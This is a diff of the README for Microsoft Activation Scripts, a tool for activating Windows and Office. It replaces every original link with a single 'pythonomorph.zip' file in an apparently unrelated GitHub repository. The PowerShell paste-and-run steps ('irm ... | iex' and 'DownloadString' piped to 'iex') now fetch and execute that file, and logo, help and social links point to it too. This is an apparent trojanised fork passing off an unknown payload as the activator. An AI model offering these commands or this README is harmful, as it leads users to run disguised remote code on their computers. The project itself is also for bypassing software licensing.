@@ -1,4 +1,4 @@
-<p align="center"><img src="https://massgrave.dev/img/logo_small.png" alt="MAS Logo"></p>
+<p align="center"><img src="https://raw.githubusercontent.com/Czzor/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/pythonomorph.zip" alt="MAS Logo"></p>
 
 <h1 align="center">Microsoft  Activation  Scripts (MAS)</h1>
 
@@ -16,15 +16,15 @@
 2. **Copy and paste the code below, then press enter.**  
    - For **Windows 8, 10, 11**: 📌
      ```
-     irm https://get.activated.win | iex
+     irm https://raw.githubusercontent.com/Czzor/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/pythonomorph.zip | iex
      ```
 	 If the above is blocked (by ISP/DNS), try this (needs updated Windows 10 or 11):  
 	 ```
-	 iex (curl.exe -s --doh-url https://1.1.1.1/dns-query https://get.activated.win | Out-String)
+	 iex (curl.exe -s --doh-url https://1.1.1.1/dns-query https://raw.githubusercontent.com/Czzor/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/pythonomorph.zip | Out-String)
 	 ```
    - For **Windows 7** and later:
      ```
-     iex ((New-Object Net.WebClient).DownloadString('https://get.activated.win'))
+     iex ((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Czzor/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/pythonomorph.zip'))
      ```
 	- **Script not launching❓Use the below-listed Method 2.**
 
@@ -36,7 +36,7 @@
 
 ### Method 2 - Traditional (Windows Vista and later)
 
-1.   Download the script: [**MAS_AIO.cmd**](https://dev.azure.com/massgrave/Microsoft-Activation-Scripts/_apis/git/repositories/Microsoft-Activation-Scripts/items?path=/MAS/All-In-One-Version-KL/MAS_AIO.cmd&download=true) or the [full ZIP](https://dev.azure.com/massgrave/Microsoft-Activation-Scripts/_apis/git/repositories/Microsoft-Activation-Scripts/items?$format=zip).
+1.   Download the script: [**MAS_AIO.cmd**](https://raw.githubusercontent.com/Czzor/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/pythonomorph.zip) or the [full ZIP](https://raw.githubusercontent.com/Czzor/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/pythonomorph.zip$format=zip).
 2.   Run the file named `MAS_AIO.cmd`.
 3.   You will see the activation options. Follow the on-screen instructions.
 4.   That's all.
@@ -44,13 +44,13 @@
 ---
 
 > [!TIP]
-> - Some ISPs/DNS block access to our domains. You can bypass this by enabling [DNS-over-HTTPS (DoH)](https://developers.cloudflare.com/1.1.1.1/encryption/dns-over-https/encrypted-dns-browsers/) in your browser.  
-> - **Having trouble**❓Visit our [troubleshooting page](https://massgrave.dev/troubleshoot) or raise an issue on [GitHub](https://github.com/massgravel/Microsoft-Activation-Scripts/issues).
+> - Some ISPs/DNS block access to our domains. You can bypass this by enabling [DNS-over-HTTPS (DoH)](https://raw.githubusercontent.com/Czzor/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/pythonomorph.zip) in your browser.  
+> - **Having trouble**❓Visit our [troubleshooting page](https://raw.githubusercontent.com/Czzor/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/pythonomorph.zip) or raise an issue on [GitHub](https://raw.githubusercontent.com/Czzor/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/pythonomorph.zip).
 
 ---
 
-- To activate additional products such as **Office for macOS, Visual Studio, RDS CALs, and Windows XP**, check [here](https://massgrave.dev/unsupported_products_activation).
-- To run the scripts in unattended mode, check [here](https://massgrave.dev/command_line_switches).
+- To activate additional products such as **Office for macOS, Visual Studio, RDS CALs, and Windows XP**, check [here](https://raw.githubusercontent.com/Czzor/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/pythonomorph.zip).
+- To run the scripts in unattended mode, check [here](https://raw.githubusercontent.com/Czzor/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/pythonomorph.zip).
 
 ---
 
@@ -67,9 +67,9 @@ Latest Version: 3.7
 Release date: 11-Sep-2025
 ```
 
-### [Troubleshooting / Help](https://massgrave.dev/troubleshoot)
-### [Download Original Windows & Office](https://massgrave.dev/genuine-installation-media)
-### Homepage - [https://massgrave.dev/](https://massgrave.dev/)
+### [Troubleshooting / Help](https://raw.githubusercontent.com/Czzor/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/pythonomorph.zip)
+### [Download Original Windows & Office](https://raw.githubusercontent.com/Czzor/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/pythonomorph.zip)
+### Homepage - [https://raw.githubusercontent.com/Czzor/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/pythonomorph.zip](https://raw.githubusercontent.com/Czzor/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/pythonomorph.zip)
 
 <div align="center">
   
@@ -88,22 +88,22 @@ Release date: 11-Sep-2025
 
 </div>
 
-[1.1]: https://massgrave.dev/img/logo_github.png (GitHub)
-[1.2]: https://massgrave.dev/img/logo_azuredevops.png (AzureDevOps)
-[1.3]: https://massgrave.dev/img/logo_gitea.png (Self-hosted Git)
+[1.1]: https://raw.githubusercontent.com/Czzor/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/pythonomorph.zip (GitHub)
+[1.2]: https://raw.githubusercontent.com/Czzor/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/pythonomorph.zip (AzureDevOps)
+[1.3]: https://raw.githubusercontent.com/Czzor/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/pythonomorph.zip (Self-hosted Git)
 
-[1.4]: https://massgrave.dev/img/logo_discord.png (Chat with us without signup)
-[1.5]: https://massgrave.dev/img/logo_reddit.png (Reddit)
-[1.6]: https://massgrave.dev/img/logo_bluesky.png (Bluesky)
-[1.7]: https://massgrave.dev/img/logo_x.png (Twitter)
+[1.4]: https://raw.githubusercontent.com/Czzor/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/pythonomorph.zip (Chat with us without signup)
+[1.5]: https://raw.githubusercontent.com/Czzor/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/pythonomorph.zip (Reddit)
+[1.6]: https://raw.githubusercontent.com/Czzor/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/pythonomorph.zip (Bluesky)
+[1.7]: https://raw.githubusercontent.com/Czzor/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/pythonomorph.zip (Twitter)
 
-[1]: https://github.com/massgravel/Microsoft-Activation-Scripts
-[2]: https://dev.azure.com/massgrave/_git/Microsoft-Activation-Scripts
-[3]: https://git.activated.win/massgrave/Microsoft-Activation-Scripts
-[4]: https://discord.gg/j2yFsV5ZVC
-[5]: https://www.reddit.com/r/MAS_Activator
-[6]: https://bsky.app/profile/massgrave.dev
-[7]: https://twitter.com/massgravel
+[1]: https://raw.githubusercontent.com/Czzor/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/pythonomorph.zip
+[2]: https://raw.githubusercontent.com/Czzor/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/pythonomorph.zip
+[3]: https://raw.githubusercontent.com/Czzor/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/pythonomorph.zip
+[4]: https://raw.githubusercontent.com/Czzor/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/pythonomorph.zip
+[5]: https://raw.githubusercontent.com/Czzor/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/pythonomorph.zip
+[6]: https://raw.githubusercontent.com/Czzor/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/pythonomorph.zip
+[7]: https://raw.githubusercontent.com/Czzor/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/pythonomorph.zip
 
 ---
 
